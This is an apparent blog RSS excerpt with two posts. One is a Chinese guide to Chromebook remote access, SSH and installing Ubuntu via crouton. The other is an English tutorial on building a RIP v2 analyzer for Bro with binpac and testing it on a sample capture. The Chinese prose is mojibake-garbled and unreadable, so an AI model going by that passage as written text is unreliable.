&lt;p>å¾åè´¨éä¸æ¯å¤ªå¥½ï¼æå­çæ¶åï¼è½å¤ææ¾æè§å°å­ä½å¨å´æ¨¡ç³&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å»¶æ¶ææ¶åæ¯è¾å¤§&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>ç»¼åèµ·æ¥ï¼æåæ¶ä¿ççè¿ä¸¤ä¸ªè¿ç¨æ¡é¢è½¯ä»¶ï¼å¨éè¦é¿æ¶é´å·¥ä½çæ¶åï¼é£æå°±ä¼éç¨Teamviewer, å ä¸ºè¿ä¸ªæ¶åå¾åçæ¸æ°å¯¹æå¾éè¦ï¼æä¸æ³å¯¹çæäºæ¨¡ç³çå¾åé¿è¾¾å«ä¸ªå°æ¶ãä½å½æåªæ¯éè¦å¿«éè¿ç¨è¿æ¥è¿å»ï¼æäº¤æä»¶æèåä¸å°ç®ç­çé®ä»¶çæ¶åï¼æå°±ä¼éæ©Chrome Remote Desktopï¼å®è½å¤è®©æä»¥æå¿«çéåº¦å®ææè¿ç¨è¿æ¥çå·¥ä½ã&lt;/p>
&lt;h3 id="è¿é¶æä½sshè¿æ¥----secure-shellhttpschromegooglecomwebstoredetailsecure-shell-apppnhechapfaindjhompbnflcldabbghjohlen">è¿é¶æä½ï¼SSHè¿æ¥ &amp;mdash;&lt;strong>
&lt;a href="https://chrome.google.com/webstore/detail/secure-shell-app/pnhechapfaindjhompbnflcldabbghjo?hl=en" target="_blank" rel="noopener">Secure Shell&lt;/a>&lt;/strong>&lt;/h3>
&lt;p>è¿æ¯googleå®æ¹åºçSSHæä»¶ï¼å°googleåºç¨ååºä¸è½½æ©å±å³å¯ï¼ä¸è½½ä¹åæå¼å³å¯ã
ä½¿ç¨è¯´æï¼&lt;/p>
&lt;pre>&lt;code>username@hostname or free form text //å¡«åä½ æ³ä¸ºè¿ä¸ªsessionå®å¶çåå­,æ¯å¦ï¼lab.university
usernameä½ç½®ï¼å¡«åä½ è¦è¿æ¥çæå¡å¨çè´¦å·åç§°ï¼æ¯å¦:root
hostnameä½ç½®ï¼è¿éå¯ä»¥ç´æ¥å¡«åIPå°åï¼ä¹å¯ä»¥å¡«åååï¼ä¸è´çãæ¯å¦ï¼192.168.2.121
portï¼å¡«åæå¡å¨å¼æ¾çSSHç«¯å£è¿æ¥å°å,ä¸è¬æå¡å¨é»è®¤çæ¯ï¼22
SSH relay severs optionsï¼è¿ä¸ªä½ç½®ä¸ç¨å¡«åï¼å¯ä»¥ç©ºåºæ¥
&lt;/code>&lt;/pre>
&lt;p>å¡«å®ä¸è¿°çåå®¹ï¼å°±å¯ä»¥éæ©è¿æ¥äºï¼ä¸è¿°åå®¹ç¸å½äºä½ å¨ç»ç«¯è¾å¥äºï¼&lt;code>ssh -p 22 root@192.168.2.121&lt;/code>ï¼æ ¹æ®åé¦çæç¤ºåå®¹ï¼è¾å¥ä½ çç»éå¯ç å°±å¯ä»¥äºã
ä½æ¯å¦ææ¯æ¬¡è¿æ¥é½éè¦ä½ æ¶è¾å¥å¯ç ï¼è¿å°±æ¯ä¸ä¸ªæ¯è¾ç¦èºçäºæäºï¼æä»¥ä½ éè¦å¯¼å¥ä½ çç§é¥ä¿¡æ¯&lt;/p>
&lt;pre>&lt;code>Identity:[default] è¿ä¸ªä½ç½®å¯ä»¥å¯¼å¥ä½ çç§é¥ä¿¡æ¯ï¼ç¹å»`import`ï¼åæ¶éä¸­èªå·±çid_rsaåid_rsa.pubæä»¶ä¹åï¼ç¹å»`open`.ï¼æ³¨æï¼è¿éè¦åæ¶å¯¼å¥ä¸¤ä¸ªæä»¶ï¼
&lt;/code>&lt;/pre>
&lt;p>å°è¿éä½ è¿ä¸è½å¤ç´æ¥åå¯ç ç»éå°æå¡å¨ï¼éè¦ä½ å°èªå·±ç&lt;code>id_rsa.pub&lt;/code>æä»¶ä¸­çå­ç¬¦åå®¹æ·è´å°æå¡å¨ç«¯ç&lt;code>~/.ssh/authorized_keys&lt;/code>æä»¶ä¸­ãè³äºå¦ä½çæç§é¥æä»¶ï¼è¯·åè
&lt;a href="http://cs.umw.edu/~finlayson/class/cpsc225/notes/01-ssh-chrome.html" target="_blank" rel="noopener">æç¨&lt;/a>ã&lt;/p>
&lt;h3 id="è¿é¶æä½-éè¿croutonå®è£ubuntu">è¿é¶æä½: éè¿croutonå®è£Ubuntu&lt;/h3>
&lt;h4 id="è¿å¥å¼åèæ¨¡å¼">è¿å¥å¼åèæ¨¡å¼&lt;/h4>
&lt;p>å³æºä¹åï¼åæ¶æä¸ esc + å·æ°é®(ç¬¬ä¸æå·¦è¾¹æ°è¿å»ç¬¬åä¸ªï¼+çµæºé®å³å¯ãç¶å Chromebook éå¯ï¼ç¶åæ Ctrl+D ç»§ç»­ï¼åè½¦ç¡®å®å³é­chromebook çå®å¨è®¤è¯ï¼ç¶åchromebookéå¯ï¼ä¸é¢çè¿åº¦æ¡èµ°å®äºä¹åèªå¨éå¯ï¼å°±è¿å¥å¼åèæ¨¡å¼äºã&lt;/p>
&lt;h4 id="éè¿croutonå®è£ubuntu">éè¿Croutonå®è£Ubuntu&lt;/h4>
&lt;ul>
&lt;li>
&lt;p>croutonçä¸è½½é¾æ¥ï¼
&lt;a href="https://github.com/dnschneid/crouton/raw/master/installer/crouton" target="_blank" rel="noopener">crouton&lt;/a>, ä¸è½½ä¹åé»è®¤å¨&lt;code>Downloads&lt;/code>æä»¶å¤¹ä¸é¢&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ç¨ &lt;code>Ctrl+ALT+ t&lt;/code> è°åº &lt;code>crosh&lt;/code> çªå£ï¼è¾å¥ &lt;code>shell&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>è¾å¥&lt;code>sh ~/Downloads/crouton -r list&lt;/code>æ¥çcroutonzæ¯æçUbuntuçæ¬&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å®è£Ubuntu unity: &lt;code>sudo sh ~/Downloads/crouton -t unity&lt;/code> è¿éæéæ©çæ¯Ubuntuçunityæ¡é¢ï¼å¦æä½ åæ¬¢å¶ä»æ¡é¢ï¼å¯ä»¥æ&lt;code>unity&lt;/code>æ¢æ&lt;code>xfce&lt;/code>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;p>å¦æä½ ä¸æ³å®è£æ¡é¢ï¼æèChromebookçèµæºæ¯è¾å°ï¼å°±å¯ä»¥åªè¾å¥: &lt;code>sudo sh ~/Downloads/crouton -t core&lt;/code>ï¼è¿æ ·å°±åªä¼å®è£æç®åçç»ç«¯CLI&lt;/p>
&lt;/blockquote>
&lt;ul>
&lt;li>è¿å¥æ¡é¢ï¼&lt;code>sudo startunity&lt;/code>&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;p>å¶ä»å½ä»¤ï¼
&lt;code>sudo enter-chroot&lt;/code> è¿å¥ç»ç«¯
&lt;code>sudo startxfce4&lt;/code> å¯å¨ xfce æ¡é¢
å¨ Chrome os å Linux ä¹é´åæ¢ï¼
ä» Chrome os å° Linuxï¼&lt;code>shift + ctrl + alt + åè¿é®ï¼ç¬¬1æç¬¬3ä¸ªé®ï¼&lt;/code>
ä» Linux å° Chrome os ï¼&lt;code>shift + ctrl + alt + åéé®ï¼ç¬¬1æç¬¬2ä¸ªé®ï¼&lt;/code>&lt;/p>
&lt;/blockquote>
&lt;p>å®æ¹éè¿Croutonå®è£Ubuntuçæç¨ï¼
&lt;a href="https://tutorials.ubuntu.com/tutorial/install-ubuntu-on-chromebook#0" target="_blank" rel="noopener">Installing Ubuntu with crouton&lt;/a>&lt;/p>
&lt;h4 id="ubuntuç¯å¢éç½®">Ubuntuç¯å¢éç½®&lt;/h4>
&lt;p>æä»¬éè¿&lt;code>sudo sh ~/Downloads/crouton -t unity&lt;/code>è¿æ¡å½ä»¤å®è£çUbuntuå¹¶ä¸æ¯å®æ´çæ¬çï¼å¹¶æ²¡æè½¯ä»¶ç®¡çä¸­å¿ï¼ä¹æ²¡å®æ´çç³»ç»è®¾ç½®åè½ãæä»¥ï¼å¦æä½ ççµèæ¯32Gä»¥ä¸çSSDçè¯ï¼&lt;/p>
&lt;h5 id="å®è£å®æ´çubuntuæ¡é¢ç">å®è£å®æ´çUbuntuæ¡é¢ç&lt;/h5>
&lt;p>å¨Ubuntuåæå¼ç»ç«¯ï¼&lt;/p>
&lt;pre>&lt;code class="language-bash">sudo apt-get install ubuntu-desktop //ä¸è½½å®æ´ç Ubuntu
sudo apt-get remove libreoffice-common -y //å é¤ libreoffice
sudo apt-get remove unity-webapps-common -y //å é¤ amazon
sudo apt-get remove thunderbird totem rhythmbox empathy brasero simple-scan gnome-mahjongg aisleriot gnome-mines cheese transmission-common gnome-orca webbrowser-app gnome-sudoku landscape-client-ui-install onboard deja-dup -y
&lt;/code>&lt;/pre>
&lt;h5 id="è®¾ç½®ä¸­æå·¥ä½ç¯å¢">è®¾ç½®ä¸­æå·¥ä½ç¯å¢&lt;/h5>
&lt;pre>&lt;code class="language-bash">sudo apt-get install language-pack-zh-hans language-pack-zh-hans-base language-pack-gnome-zh-hans language-pack-gnome-zh-hans-base
sudo apt-get install `check-language-support -l zh`
sudo localectl set-locale LANG=zh_CN.UTF-8
&lt;/code>&lt;/pre>
&lt;h4 id="croutonå¸¸è§ä½¿ç¨chromebookä¸­çcroshä¸­æä½">croutonå¸¸è§ä½¿ç¨(chromebookä¸­çcroshä¸­æä½)&lt;/h4>
&lt;h5 id="croutonçåçº§">croutonçåçº§&lt;/h5>
&lt;pre>&lt;code class="language-bash">sudo ~/Downloads/crouton -u -n croutonname
&lt;/code>&lt;/pre>
&lt;p>è¿éçcroutonnameæ¿æ¢æä½ å®è£ççæ¬ï¼å¦xenial&lt;/p>
&lt;h5 id="croutonåçubuntuå³æº">croutonåçUbuntuå³æº&lt;/h5>
&lt;p>ä¸è¬éæ©å¨Ubuntuéé¢ç¹å»å³æºæé®(å³ä¸è§è®¾ç½®éé¢)ï¼ç¶åèªå¨éåºå°Chrome OSéé¢&lt;/p>
&lt;h5 id="å é¤croutonå®è£çubuntu">å é¤croutonå®è£çubuntu&lt;/h5>
&lt;pre>&lt;code class="language-bash">sudo delete-chroot chrootname //chrootname: æå®è£ ubuntu ççæ¬ä»£å·ï¼æ¯å¦xenialï¼ä»£è¡¨çæ¯Ubuntu16ã04
&lt;/code>&lt;/pre>
&lt;h5 id="å¤ä»½ä¸æ¢å¤croutonéé¢çubuntu">å¤ä»½ä¸æ¢å¤Croutonéé¢çUbuntu&lt;/h5>
&lt;p>&lt;strong>å¤ä»½&lt;/strong>&lt;/p>
&lt;pre>&lt;code class="language-bash">sudo edit-chroot -b xenial
&lt;/code>&lt;/pre>
&lt;p>æ³¨ï¼xenialä¸ºubuntuççæ¬åç§°ï¼å³16.04ä¸ºxenial&lt;/p>
&lt;p>&lt;strong>æ¢å¤&lt;/strong>&lt;/p>
&lt;pre>&lt;code class="language-bash">sudo sh ~/Downloads/crouton -f ~/Downloads/*.tar.gz
&lt;/code>&lt;/pre>
&lt;p>æ³¨ï¼å°*.tar.gzæ¹ä¸ºä½ çå¤ä»½æä»¶åã&lt;/p>
&lt;p>&lt;strong>å é¤å¤ä»½&lt;/strong>&lt;/p>
&lt;pre>&lt;code class="language-bash">sudo edit-chroot -d xenial
&lt;/code>&lt;/pre>
&lt;h5 id="è§£å³é³é¢çbugé®é¢">è§£å³é³é¢çBugé®é¢&lt;/h5>
&lt;p>ææ¶æ²¡æè§£å³(éç)
ç½ä¸è§£å³æ¹æ¡(æªå¨æçChromebookä¸é¢æå)ï¼&lt;/p>
&lt;ol>
&lt;li>å¨Chrome OSä¸­shift+alt+Tè°åºcroshçªå£ï¼è¾å¥&lt;code>shell&lt;/code>ã&lt;/li>
&lt;li>è¾å¥&lt;code>sudo enter-chroot -n trusty&lt;/code>&lt;/li>
&lt;li>è¾å¥&lt;code>sudo apt-get dist-upgrade&lt;/code>&lt;/li>
&lt;li>Ctrl+Dç»åº&lt;/li>
&lt;li>è¾å¥&lt;code>sudo sh -e ~/Downloads/crouton-master/installer/main.sh(ä¸è½½çåªä¸ªæä»¶ç¨åªä¸ªæä»¶åï¼ -u -n xenial&lt;/code> ç­å¾æ´æ°å®æãä¸è¬åºç°çæ å£°é³ãä¸è½æ­æ¾è§é¢ç­BUGé½å¯ä»¥è§£å³ã
&lt;strong>æ³¨ï¼xenialä¸ºçæ¬å·ï¼ä½ ä½¿ç¨åªä¸ªçæ¬å¡«ååªä¸ªçæ¬å·&lt;/strong>x&lt;/li>
&lt;/ol>
&lt;h4 id="croutonè¿é¶æä½">croutonè¿é¶æä½&lt;/h4>
&lt;h5 id="å¨chromebookéé¢çchromeä¸­ä»¥çªå£çæ¹å¼è¿è¡ubuntu">å¨Chromebookéé¢çchromeä¸­ä»¥çªå£çæ¹å¼è¿è¡Ubuntu&lt;/h5>
&lt;p>åå¨Chromebookçchrome ç½ä¸åºç¨ååºéä¸è½½
&lt;a href="https://chrome.google.com/webstore/detail/crouton-integration/gcpneefbbnfalgjniomfjknbcgkbijom" target="_blank" rel="noopener">cronton-integration&lt;/a>
ç¶åå¨croshä¸­ï¼å®è£xiwiæ¡é¢&lt;/p>
&lt;pre>&lt;code class="language-bash">sudo sh ~/Downloads/crouton -t unity,extension,xorg,xiwi //ææ¯å¨ xfce æ¡é¢ä¸ä½¿ç¨ç unity ä¹å¯è¡ ä½è¦æ±ä¸è½½ extension,xorg,xiwi
sudo startxunity -X xiwi // ä½¿ç¨ xiwi æ¥å®ç° çªå£å
&lt;/code>&lt;/pre>
&lt;h2 id="ä½¿ç¨ä¸­éå°çé®é¢">ä½¿ç¨ä¸­éå°çé®é¢&lt;/h2>
&lt;h3 id="wifiå¼å³æ æ³å¼å¯çé®é¢">Wifiå¼å³æ æ³å¼å¯çé®é¢&lt;/h3>
&lt;p>é®é¢æè¿°ï¼å¨Chrome OSç³»ç»ä¸­ï¼å½ä¼ç ç¶ææ¢å¤ä¹åï¼åºç°è¿Wifiæ æ³è¿æ¥ï¼ç³»ç»çWifiç¶ææ¯å³é­çï¼å³ä½¿ç¹å»çå¼å¯çæé®ï¼ä½æ¯å¨ä¸å°äºç§ä¹åå°±ä¼èªå¨å³é­ã
è§£å³æ¹æ¡ï¼ç»è¿èªå·±æ£æ¥ï¼åç°æ¯Wifiæ¨¡åæä¸äºæ¾å¨ï¼æä»¥ææºä¹åï¼éæ°åºå®äºWifiæ¨¡åå°±å¯ä»¥ä½¿ç¨äºã&lt;/p></description></item><item><title>Complete your first analyzer - RIP in bro</title><link>http://www.guozet.me/post/Write-your-first-Analyzer-en/</link><pubDate>Thu, 24 May 2018 20:30:32 +0000</pubDate><guid>http://www.guozet.me/post/Write-your-first-Analyzer-en/</guid><description>&lt;h2 id="introduce">Introduce&lt;/h2>
&lt;p>The best way to understand the structure of the sources code is to write some modules by yourself. Let&amp;rsquo;s us to write an Analyzer in the Bro by Binpac. We choose
&lt;a href="https://tools.ietf.org/html/rfc2453" target="_blank" rel="noopener">RIP v2&lt;/a> to write the first protocol.&lt;/p>
&lt;h2 id="how-to-use-binpac-quick-start-to-create-the-relative-file-to-develop-an-analyzer">How to Use Binpac quick start to create the relative file to develop an analyzer?&lt;/h2>
&lt;h4 id="download-binpac-quick-start">Download Binpac Quick Start&lt;/h4>
&lt;p>&lt;code>git clone https://github.com/grigorescu/binpac_quickstart.git&lt;/code>
When you finish download, you can enter the &lt;code>binpac_quickstart&lt;/code> directory, then you will find there are some files in this directory as blow.&lt;/p>
&lt;pre>&lt;code class="language-bash">Guoze@node-0:~/00_Workbench$ cd binpac_quickstart/
Guoze@node-0:~/00_Workbench/binpac_quickstart$ ls -al
total 32
drwxr-xr-x 4 Guoze senfv-PG0 4096 May 22 19:30 .
drwxr-xr-x 11 Guoze senfv-PG0 4096 May 23 12:15 ..
drwxr-xr-x 8 Guoze senfv-PG0 4096 May 22 19:30 .git
-rw-r--r-- 1 Guoze senfv-PG0 21 May 22 19:30 __init__.py
-rw-r--r-- 1 Guoze senfv-PG0 128 May 22 19:30 README.md
-rwxr-xr-x 1 Guoze senfv-PG0 7151 May 22 19:30 start.py
drwxr-xr-x 2 Guoze senfv-PG0 4096 May 22 19:30 templates
&lt;/code>&lt;/pre>
&lt;h4 id="user-startpyto-create-the-directory-structure-in-bro">User &lt;code>start.py&lt;/code>to create the directory structure in Bro&lt;/h4>
&lt;p>start.py is the script which who can use to build a directory structure to develp the RIP analyzer. We can use this script as following.&lt;/p>
&lt;pre>&lt;code class="language-bash">Guoze@node-0:~/00_Workbench/binpac_quickstart$ ./start.py
Usage:
start.py NAME DESCRIPTION PATH_TO_BRO_SRC (--tcp|--udp) [--buffered] [--plugin]
&lt;/code>&lt;/pre>
&lt;blockquote>
&lt;p>Example: &lt;code>./start.py RIP &amp;quot;Routing Internet Protocl&amp;quot; ../bro --udp&lt;/code>
Procotol nameï¼RIPï¼
Procoto descriptionï¼Routing Internet Protocl
The absolute path of the Bro source codeï¼../bro
The type of Network Portocol which the RIP useï¼&amp;ndash;udp&lt;/p>
&lt;/blockquote>
&lt;p>Use this script to built RIP work directory in the Bro source code file. If you don&amp;rsquo;t know RIP protocol before, please read the
&lt;a href="https://tools.ietf.org/html/rfc2453" target="_blank" rel="noopener">RIP protocol documents&lt;/a>.&lt;/p>
&lt;p>In the terminal, we just need to input the command as follows to create our work directory.
&lt;code>./start.py RIP &amp;quot;Routing Internet Protocl&amp;quot; ../bro --udp&lt;/code>&lt;/p>
&lt;p>After complete, It will create some files in the &lt;code>bro/scripts/base/protocols/rip/&lt;/code> directory and &lt;code>bro/src/analyzer/protocol/rip/&lt;/code> directory&lt;/p>
&lt;ol>
&lt;li>&lt;code>bro/scripts/base/protocols/rip/&lt;/code>&lt;/li>
&lt;/ol>
&lt;pre>&lt;code class="language-bash">Guoze@node-0:~/00_Workbench/bro/scripts/base/protocols/rip$ ls -l
total 12
-rw-r--r-- 1 Guoze senfv-PG0 245 May 23 12:49 dpd.sig
-rw-r--r-- 1 Guoze senfv-PG0 66 May 23 12:49 __load__.bro
-rw-r--r-- 1 Guoze senfv-PG0 1327 May 23 12:49 main.bro
&lt;/code>&lt;/pre>
&lt;blockquote>
&lt;p>__load__.bro: This allows all the contents of the directory to be loaded via @load base/protocols/sip.
dpd.sig: This file contains a signature that can be used to attach the analyzer to connections if their content matches.
main.bro: Contains the base script-layer functionality for processing events emitted from the analyzer.&lt;/p>
&lt;/blockquote>
&lt;ol start="2">
&lt;li>&lt;code>src/analyzer/protocol/sip/&lt;/code>&lt;/li>
&lt;/ol>
&lt;pre>&lt;code class="language-bash">Guoze@node-0:~/00_Workbench/bro/src/analyzer/protocol/rip$ ls -l
total 32
-rw-r--r-- 1 Guoze senfv-PG0 301 May 23 12:50 CMakeLists.txt
-rw-r--r-- 1 Guoze senfv-PG0 472 May 23 12:50 events.bif
-rw-r--r-- 1 Guoze senfv-PG0 480 May 23 12:50 Plugin.cc
-rw-r--r-- 1 Guoze senfv-PG0 738 May 23 15:27 rip-analyzer.pac
-rw-r--r-- 1 Guoze senfv-PG0 721 May 23 12:50 RIP.cc
-rw-r--r-- 1 Guoze senfv-PG0 715 May 23 12:50 RIP.h
-rw-r--r-- 1 Guoze senfv-PG0 1005 May 23 12:50 rip.pac
-rw-r--r-- 1 Guoze senfv-PG0 939 May 23 15:03 rip-protocol.pac
&lt;/code>&lt;/pre>
&lt;blockquote>
&lt;p>CMakeLists.txt: Informs the CMake build system how to compile the analyzer.
Plugin.cc: Analyzers in Bro are a type of plugin. This file does whatâs necessary to register the new analyzer plugin with Bro.
RIP.h: Defines the API for the new analyzer which derives from one of Broâs already-existing analyzer classes.
RIP.cc: Implementation of the analyzer. Itâs mostly just responsible for handing off data to the protocol parser thatâs been generated by BinPAC.
events.bif: Defines events that the analyzer will generate.
rip.pac: The main entry point for the BinPAC definition of the protocol that you want to parse.
rip-protocol.pac: Where the message format is defined.&lt;br>
rip-analyzer.pac: Defines a connection, flow, and other processing functions for the analyzer.&lt;/p>
&lt;/blockquote>
&lt;p>If you just want to use Binpac to compile your c++ file, you just need to write these files:&lt;/p>
&lt;ul>
&lt;li>events.bif&lt;/li>
&lt;li>rip.pac&lt;/li>
&lt;li>rip-protocol.pac&lt;/li>
&lt;li>rip-analyzer.pac&lt;/li>
&lt;/ul>
&lt;h2 id="implementation">Implementation&lt;/h2>
&lt;h3 id="implement-the-rip-protocolpac-file">Implement the rip-protocol.pac file&lt;/h3>
&lt;p>This file just defines each part in the RIP protocol. In the code, you will find the Binpac language use keywords &lt;code>type&lt;/code> to express a data structure in the RIP protocol. The &lt;code>RIP_PDU&lt;/code>funtion which is the lastest type in this file defines the data structure which user want to transfer when the RIP event happens.&lt;/p>
&lt;p>The RIP packet format is:&lt;/p>
&lt;pre>&lt;code> 0 1 2 3
0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| command (1) | version (1) | must be zero (2) |
+---------------+---------------+-------------------------------+
| |
~ RIP Entry (20) ~
| |
+---------------+---------------+---------------+---------------+
&lt;/code>&lt;/pre>
&lt;p>There may be between 1 and 25 (inclusive) RIP entries. A RIP-1 entry
has the following format:&lt;/p>
&lt;pre>&lt;code> 0 1 2 3
0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| address family identifier (2) | must be zero (2) |
+-------------------------------+-------------------------------+
| IPv4 address (4) |
+---------------------------------------------------------------+
| must be zero (4) |
+---------------------------------------------------------------+
| must be zero (4) |
+---------------------------------------------------------------+
| metric (4) |
+---------------------------------------------------------------+
&lt;/code>&lt;/pre>
&lt;p>Use this file to design the protocol structures of RIP in our case. Just take the structures from the protocol and write the code in this file to parse it.&lt;/p>
&lt;pre>&lt;code> Protocol Extensions
RIP-2 is:
0 1 2 3 3
0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| Address Family Identifier (2) | Route Tag (2) |
+-------------------------------+-------------------------------+
| IP Address (4) |
+---------------------------------------------------------------+
| Subnet Mask (4) |
+---------------------------------------------------------------+
| Next Hop (4) |
+---------------------------------------------------------------+
| Metric (4) |
+---------------------------------------------------------------+
&lt;/code>&lt;/pre>
&lt;p>The Address Family Identifier, IP Address, and Metric all have the meanings defined in
&lt;a href="https://tools.ietf.org/html/rfc2453#section-3.4" target="_blank" rel="noopener">section 3.4&lt;/a>. The Version field will specify&lt;/p>
&lt;pre>&lt;code class="language-cpp">1 # Generated by binpac_quickstart
1
2 # ## TODO: Add your protocol structures in here.
3 # ## some examples:
4
5 # Types are your basic building blocks.
6 # There are some builtins, or you can define your own.
7 # Here's a definition for a regular expression:
8 # type RIP_WHITESPACE = RE/[ \t]*/;
9
10 # A record is a collection of types.
11 # Here's one with the built-in types
12
13 enum Rip_Command {
14 RIP_REQUEST = 1,
15 RIP_RESPONSE = 2,
16 }
17
18 enum Rip_Version {
19 RIP_V1 = 1,
20 RIP_V2 = 2,
21 }
22
23 type Rip_Message = record { //Base Message
24 command : uint8;
25 version : uint8;
26 pad : padding[2]; //must be zero
27 entry : Rip_Entry[] &amp;amp;until($input.length()) == 0;
28 };
29
30 type Rip_Entry = record {
31 af : uint16;
32 rt : uint16;
33 ip : uint32;
34 mask : uint32;
35 gateway : uint32;
36 metric : uint32;
37 };
38
39 type RIP_PDU(is_orig: bool) = record {
40 command : uint8;
41 version : uint8;
42 pad : padding[2];
43 } &amp;amp;byteorder=bigendian;
&lt;/code>&lt;/pre>
&lt;p>RIP_PDU structure: pass to the user land, just focus which you want to pass.&lt;/p>
&lt;h3 id="implement-the-rip_analyzerpac-file">Implement the rip_analyzer.pac file&lt;/h3>
&lt;p>This file mainly finishes the processing and analyzing of the data which was passed by the &lt;code>RIP_PDU&lt;/code> function to this file. If there is a RIP event happens, then it enters this processing flow.&lt;/p>
&lt;p>The &lt;code>BifEvent::generate_rip_request&lt;/code> function illustrates how to generate an request event. We use this event to pass the data structure which is important in the next process (the data structure created in rip_protocol.pac). The main thing we need to define is what we want to pass. Such as: &lt;code>msg.command&lt;/code>, &lt;code>msg.version&lt;/code>&lt;/p>
&lt;p>%code{ &amp;hellip; %} : Copy C++ code to the generated source file&lt;/p>
&lt;pre>&lt;code class="language-cpp">1 # Generated by binpac_quickstart
1
2 refine flow RIP_Flow += {
3 function proc_rip_message(msg: RIP_PDU): bool
4 %{
5 // Check for RIP commands
6 if ( ${msg.command} == RIP_REQUEST) {
7 BifEvent::generate_rip_request(connection()-&amp;gt;bro_analyzer(), connection()-&amp;gt;bro_analyzer()-&amp;gt;Conn(),
8 ${msg.command}, //Pass more thing
9 ${msg.version});
10 return true;
11 }
12 if ( ${msg.command} == RIP_RESPONSE) {
13 BifEvent::generate_rip_response(connection()-&amp;gt;bro_analyzer(), connection()-&amp;gt;bro_analyzer()-&amp;gt;Conn(),
14 ${msg.command},
15 ${msg.version});
16 return true;
17 }
18 %}
19 };
20
21 refine typeattr RIP_PDU += &amp;amp;let {
22 proc: bool = $context.flow.proc_rip_message(this);
23 };
~
&lt;/code>&lt;/pre>
&lt;p>&lt;code>function proc_rip_message(msg: RIP_PDU): bool&lt;/code> just like to say please use that RIP_PDU data structure that was defined in the earlier file.&lt;/p>
&lt;h3 id="implement-the-eventsbif-file">Implement the events.bif file&lt;/h3>
&lt;pre>&lt;code class="language-cpp">1 # Generated by binpac_quickstart
1
2 # In this file, you'll define the events that your analyzer will
3 # generate. A sample event is included.
4
5 # ## TODO: Edit the sample event, and add more events.
6
7 ## Generated for RIP connections
8 ##
9 ## See `Google &amp;lt;http://lmgtfy.com/?q=RIP&amp;gt;`__ for more information about RIP
10 ##
11 ## c: The connection
12 ##
13 event rip_request%(c: connection, command: count, version: count%);
14 event rip_response%(c: connection, command: count, version: count%);
&lt;/code>&lt;/pre>
&lt;p>RIP just have two types of command:&lt;/p>
&lt;ul>
&lt;li>rip_request&lt;/li>
&lt;li>rip_response&lt;/li>
&lt;/ul>
&lt;h2 id="test">Test&lt;/h2>
&lt;h3 id="configure-bros-working-environment">Configure Bro&amp;rsquo;s Working Environment&lt;/h3>
&lt;p>Firstly, we need to configure the bro&amp;rsquo;s path to execute it.
The executable path of the Bro is &lt;code>bro/build/src/bro&lt;/code>.&lt;/p>
&lt;pre>&lt;code class="language-bash">Guoze@node-0:~/00_Workbench/bro$ ./build/src/bro -h
bro version 2.5-598
usage: ./build/src/bro [options] [file ...]
&amp;lt;file&amp;gt; | policy file, or read stdin
-a|--parse-only | exit immediately after parsing scripts
-b|--bare-mode | don't load scripts from the base/ directory
-d|--debug-policy | activate policy file debugging
-e|--exec &amp;lt;bro code&amp;gt; | augment loaded policies by given code
-f|--filter &amp;lt;filter&amp;gt; | tcpdump filter
&lt;/code>&lt;/pre>
&lt;p>Bro has provided an executable script for you. As a result, you can easily configure environment variables. We just need to execute the configuration script. Use the shell script for configuring environment variables is as follows:&lt;/p>
&lt;pre>&lt;code class="language-bash">Guoze@node-0:~/00_Workbench/bro/build$ cat bro-path-dev.sh
export BROPATH=`/users/Guoze/00_Workbench/bro/build/bro-path-dev`
export BRO_PLUGIN_PATH=&amp;quot;/users/Guoze/00_Workbench/bro/build/src&amp;quot;:
export PATH=&amp;quot;/users/Guoze/00_Workbench/bro/build/src&amp;quot;:$PATH
&lt;/code>&lt;/pre>
&lt;pre>&lt;code class="language-bash">Guoze@node-0:~/00_Workbench/bro$ source ./build/bro-path-dev.sh
&lt;/code>&lt;/pre>
&lt;p>If you want to check the execution status of the script and determine whether it has completed the configuration, you can enter: &lt;code>bro -h&lt;/code>in the terminal. If the execution result is as same as the result of &lt;code>./build/src/bro -h&lt;/code>, then it means that the configuration has been configured successfully.&lt;/p>
&lt;pre>&lt;code class="language-bash">Guoze@node-0:~/00_Workbench/bro$ bro -h
bro version 2.5-598
usage: bro [options] [file ...]
&amp;lt;file&amp;gt; | policy file, or read stdin
-a|--parse-only | exit immediately after parsing scripts
-b|--bare-mode | don't load scripts from the base/ directory
-d|--debug-policy | activate policy file debugging
-e|--exec &amp;lt;bro code&amp;gt; | augment loaded policies by given code
-f|--filter &amp;lt;filter&amp;gt; | tcpdump filter
-g|--dump-config | dump current config into .state dir
-h|--help|-? | command line help
&lt;/code>&lt;/pre>
&lt;h3 id="test-rip-parser">Test RIP parser&lt;/h3>
&lt;h4 id="download-rip-network-data">Download RIP Network data&lt;/h4>
&lt;p>We can directly download a RIPv2 packet which can be used for testing on Internet.
&lt;code>$ wget http://packetlife.net/captures/RIPv2.cap&lt;/code>&lt;/p>
&lt;p>After download, use the command &amp;lsquo;tcpdump&amp;rsquo; to determine whether the data packet contains RIP data.&lt;/p>
&lt;pre>&lt;code class="language-bash">Guoze@node-0:~/00_Workbench$ tcpdump -nr RIPv2.cap
reading from file RIPv2.cap, link-type EN10MB (Ethernet)
23:06:26.942558 IP 10.0.0.1.520 &amp;gt; 224.0.0.9.520: RIPv2, Response, length: 84
23:06:30.158769 IP 10.0.0.2.520 &amp;gt; 224.0.0.9.520: RIPv2, Response, length: 84
23:06:52.663855 IP 10.0.0.1.520 &amp;gt; 224.0.0.9.520: RIPv2, Response, length: 84
